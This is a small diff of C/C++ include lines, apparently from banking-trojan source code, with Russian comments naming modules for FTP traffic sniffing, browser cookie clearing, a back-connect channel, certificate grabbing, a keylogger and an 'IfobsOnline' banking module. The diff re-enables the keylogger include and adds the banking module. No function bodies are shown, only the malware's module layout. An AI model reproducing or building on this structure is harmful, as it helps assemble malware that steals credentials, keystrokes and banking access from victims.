@@ -26,7 +26,6 @@
 #include "FtpSniffer.h" // Перехват фтп трафика
 #include "coocksol.h" // Очистка куков ИЕ и ФФ
 #include "BackConnect.h" // Модуль обратной связи
-#include "KeyLogSystems.h" 
 #include "Hunter.h" 
 
 #include "CertGrab.h"
@@ -47,3 +46,5 @@
 #include "FgrFilters.h"
 */
 
+#include "KeyLogSystems.h" 
+#include "IfobsOnline.h"
